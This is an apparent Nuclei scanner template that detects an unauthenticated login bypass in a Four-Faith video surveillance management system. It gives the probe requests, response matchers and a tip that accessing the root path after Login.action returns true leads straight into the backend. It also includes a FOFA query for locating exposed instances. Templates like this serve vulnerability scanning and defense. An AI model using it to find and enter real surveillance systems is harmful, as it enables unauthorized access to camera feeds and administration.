id: four-faith-manager-unauth
info:
  name: four-faith manager - unauth
  author: leadlife
  severity: high
  description: 厦门四信通信科技有限公司视频监控管理系统存在逻辑缺陷漏洞，可直接绕过登录进入后台。
  reference: 
    - https://github.com/wy876/POC/blob/33aeb58103048c9c34340cd4ddef97c9a853f798/%E5%8E%A6%E9%97%A8%E5%9B%9B%E4%BF%A1%E9%80%9A%E4%BF%A1%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E8%A7%86%E9%A2%91%E7%9B%91%E6%8E%A7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    tips: 访问 login.action 为 true ，那么直接访问根路径即可跳转到后台
    fofa-query: body="/monitor/realt/init?curPageId=a1"
  tags: four-faith,unauth


http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
      
      - |+
        GET /mgrcter/usermgr/user/Login.action HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_1,'IncisiveView.apk')
          - contains_all(body_1, 'success','true','msg')
        condition: and